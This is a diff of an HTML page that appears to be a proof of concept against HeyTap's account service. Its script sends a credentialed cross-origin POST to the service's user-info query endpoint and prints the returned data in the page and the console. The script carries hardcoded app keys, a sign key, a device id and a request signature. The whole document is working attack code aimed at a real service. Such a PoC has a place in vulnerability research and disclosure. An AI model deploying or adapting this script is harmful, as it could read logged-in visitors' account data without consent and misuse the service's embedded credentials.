@@ -1,29 +1,4 @@
-<script>
-fetch("https://id-sg.heytap.com/uc/web/v1/user-info/query-basic", {
-  "headers": {
-    "x-app-acappkey": "CuGsbe6HdAe6vDBHFew2Di",
-    "x-app-deviceid": "3b82f93bb3a737ae6fd9817f8ce9f1e2",
-    "x-app-fromht": "true",
-    "x-app-overseaclient": "true",
-    "x-biz-appkey": "TZeSXfQXxrCyjhvARaVrmw",
-    "x-device-brand": "HEYTAP",
-    "x-device-clienttype": "WEB",
-    "x-envelope-version": "V1",
-    "x-requesttime": "1767565064629",
-    "x-sign": "b4B5KDwzXYWnoZ5jjDm6KyFda7Q=",
-    "x-sign-key": "4iAEb620alQ8s8c8ss8o0K8sS",
-    "x-timezone": "GMT+1",
-    "x-web-client-type": "pc"
-  },
-  "referrer": "https://id.heytap.com/",
-  "body": "\"Ik6Dp63RWsoh4ZMHxwn6kYgmbA8fPjJXPr5hd7OgA70necgbGyPaVIOzz6Rp1+0j82SAccs5VcwYgWiHKgkWJJ6etOlV0rOLZviYev4WUTGmJU8i9y/pkphZKsYedvtXlBHypbECtNYPEXWxE7ovYgVCixfK3Y4L2uDhnEcsqbQ=.hnR8OM6+1DBzC3[...]\"",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-});
-</script>
-
-
+<!DOCTYPE html>
 <script>
 fetch("https://id-sg.heytap.com/uc/web/v1/user-info/query-basic", {
   "headers": {
@@ -48,21 +23,15 @@ fetch("https://id-sg.heytap.com/uc/web/v1/user-info/query-basic", {
   "credentials": "include"
 })
 .then(async response => {
-  // Get response text (handles JSON as text too for display purposes)
-  const contentType = response.headers.get('content-type') || '';
+  // Always read response as raw text and display it (no JSON parsing)
   let displayText;
   try {
-    if (contentType.includes('application/json')) {
-      const json = await response.json();
-      displayText = JSON.stringify(json, null, 2);
-    } else {
-      displayText = await response.text();
-    }
+    displayText = await response.text();
   } catch (err) {
     displayText = 'Error reading response: ' + err;
   }
 
-  // Safe HTML-escape before inserting into a <pre>
+  // Escape before inserting into the page
   function escapeHtml(str) {
     return String(str)
       .replace(/&/g, '&amp;')
@@ -72,19 +41,17 @@ fetch("https://id-sg.heytap.com/uc/web/v1/user-info/query-basic", {
       .replace(/'/g, '&#39;');
   }
 
-  // Show the response and the string "encrypted data"
   const wrapper = document.createElement('div');
   const pre = document.createElement('pre');
-  pre.textContent = displayText;
+  pre.textContent = displayText; // already safe when assigned to textContent
   const note = document.createElement('p');
-  note.textContent = 'encrypted data';
+  note.textContent = 'encrypted text';
 
   wrapper.appendChild(pre);
   wrapper.appendChild(note);
   document.body.appendChild(wrapper);
 
-  // Also log to console
-  console.log(displayText, 'encrypted data');
+  console.log(displayText, 'encrypted text');
 })
 .catch(err => {
   const errMsg = 'Fetch error: ' + err;
